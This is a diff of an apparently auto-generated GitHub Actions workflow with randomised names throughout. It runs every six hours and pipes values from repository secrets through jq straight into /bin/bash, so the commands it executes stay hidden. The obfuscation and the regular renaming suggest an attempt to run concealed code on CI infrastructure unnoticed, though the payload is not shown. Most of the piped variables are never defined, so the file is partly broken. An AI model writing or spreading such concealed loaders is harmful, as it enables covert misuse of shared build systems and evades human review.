@@ -3,27 +3,30 @@ name: vnadujl
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 3/6 * * *'
-
-jobs:  # 14674
+    - cron: '18 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: vnadujl
         env:
-          cdubf98: ${{ secrets.cdubf98 }}
+          uyoli25365: ${{ secrets.uyoli25365 }}
         run: |
-          echo $cdubf98 | jq -r .gziht0333 | /bin/bash
-          echo $cgx8 | jq -r .vpj84 | /bin/bash
-          echo $o4 | jq -r .uv21009 | /bin/bash
-          echo $cmms2796 | jq -r .gel1219 | /bin/bash
-          echo $klsib8 | jq -r .pgo63111 | /bin/bash
-          echo $zoix6944 | jq -r .a3488 | /bin/bash
-          echo $yvhrb4 | jq -r .wo1 | /bin/bash
-          echo $d38074 | jq -r .vxlm2222 | /bin/bash
-          echo $il0 | jq -r .sjiy17 | /bin/bash
-          echo $dwbob0 | jq -r .tfla60 | /bin/bash
-          echo $ui7 | jq -r .iaobx06 | /bin/bash
-          echo $bene28 | jq -r .i6 | /bin/bash
+          echo $uyoli25365 | jq -r .uh3 | /bin/bash
+          echo $vfeke225 | jq -r .v5669 | /bin/bash
+          echo $it2453 | jq -r .p26 | /bin/bash
+          echo $tdx14 | jq -r .bm6 | /bin/bash
+          echo $qxk3453 | jq -r .goeq41 | /bin/bash
+          echo $vlyhb3637 | jq -r .dac412 | /bin/bash
+          echo $drxzu1 | jq -r .emv6245 | /bin/bash
+          echo $tc63 | jq -r .x169 | /bin/bash
+          echo $qc39424 | jq -r .imvwp5 | /bin/bash
+          echo $rsth6641 | jq -r .smbl46 | /bin/bash
+          echo $bz10 | jq -r .vk6 | /bin/bash
+          echo $psmw0 | jq -r .l82 | /bin/bash
+          echo $sujdn43048 | jq -r .in8387 | /bin/bash
+          echo $qppga03 | jq -r .uphi8 | /bin/bash
+          echo $f356 | jq -r .ocm409 | /bin/bash
+          echo $uwmcz568 | jq -r .qteg5845 | /bin/bash
 
